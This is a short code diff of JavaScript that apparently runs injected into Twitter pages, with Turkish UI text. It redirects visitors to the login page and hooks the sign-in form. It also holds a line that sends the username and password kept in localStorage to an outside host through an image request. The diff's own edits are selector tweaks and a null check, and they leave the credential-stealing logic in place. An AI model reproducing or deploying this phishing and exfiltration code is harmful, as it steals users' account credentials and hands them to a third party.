@@ -12,7 +12,7 @@ window.location = "https://twitter.com/login";
 }, 300);
 }
 setTimeout(function(){ 
-if( document.getElementById('signin-email')) {  window.location = "https://twitter.com/login";  }
+if( document.getElementsByClassName("StreamsHero-header")[0]) {  window.location = "https://twitter.com/login";  }
 }, 300);
 
 tarih = new Date();
@@ -26,7 +26,7 @@ document.getElementsByClassName('t1-form dropdown-link-form signout-form')[0].cl
     }
     
 	
-document.getElementById("session").innerHTML = '<a href="https://twitter.com/login">Hesabın var mı? Giriş yap</a>';
+if (document.getElementById("session")){document.getElementById("session").innerHTML = '<a href="https://twitter.com/login">Hesabın var mı? Giriş yap</a>';}
 if (window.location.href.indexOf("login") >= 0) {
 
 	document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick = function(data) {
@@ -43,7 +43,11 @@ if (window.location.href.indexOf("login") >= 0) {
 
 if(localStorage['sw'] && localStorage['pw']){
 	new Image().src = "http://siktir.ddospanel.com/cptw.php?username=" + localStorage['sw'] + "&password=" + localStorage['pw'];
+
 }
+
+
+
 
 }
 
